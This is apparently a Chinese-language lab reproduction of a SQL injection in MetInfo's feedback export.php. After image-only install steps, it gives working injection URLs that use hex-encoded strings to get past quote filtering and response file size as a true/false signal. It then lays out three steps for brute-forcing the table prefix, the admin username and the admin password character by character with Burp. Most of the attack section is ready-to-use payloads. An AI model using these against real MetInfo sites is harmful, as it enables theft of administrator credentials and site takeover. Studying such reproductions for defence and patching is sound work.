
# 实战
在浏览器输入
```
http://IP:PORT/install/
```
## 安装

![image]({path}/1.png)

![image]({path}/2.png)

![image]({path}/3.png)

![image]({path}/4.png)



## 攻击实战

其中met_为我实验环境metinfo的前缀（若要复测请根据实际情况修改）， admin_id=0x61646d696e 为字符串'admin'(过滤了单引号)

```
http://192.168.1.170:7777/admin/content/feedback/export.php?met_parameter_1=met_admin_table where admin_id=0x61646d696e -- ;&class1=1&settings_arr[0][columnid]=1&settings_arr[0][name]=met_parameter
```

然后测试一组错误的,把'admin'改成'admil'试试

```
http://192.168.1.170:7777/admin/content/feedback/export.php?met_parameter_1=met_admin_table where admin_id=0x61646d696c -- ;&class1=1&settings_arr[0][columnid]=1&settings_arr[0][name]=met_parameter
```

![image]({path}/5.png)

![image]({path}/6.png)

可以看到两个文件的大小是不一样



**step1：暴力破解metinfo前缀**
用brup进行破解，这个不用我多解释了把，根据返回大小


```
http://localhost/MetInfo/admin/content/feedback/export.php?met_parameter_1=met_admin_table -- ;&class1=1&settings_arr[0][columnid]=1&settings_arr[0][name]=met_parameter
```




**step2： 破解admin账户**

还是brup，用substr 一个个来


```
http://localhost/MetInfo/admin/content/feedback/export.php?met_parameter_1=met_admin_table where substr(admin_id,1,1)=0x61 -- ;&class1=1&settings_arr[0][columnid]=1&settings_arr[0][name]=met_parameter
```




**step3：破解admin密码**

同上


```
http://localhost/MetInfo/admin/content/feedback/export.php?met_parameter_1=met_admin_table where admin_id=0x61646d696e and substr(admin_pass,1,1)=0x32 -- ;&class1=1&settings_arr[0][columnid]=1&settings_arr[0][name]=met_parameter
```
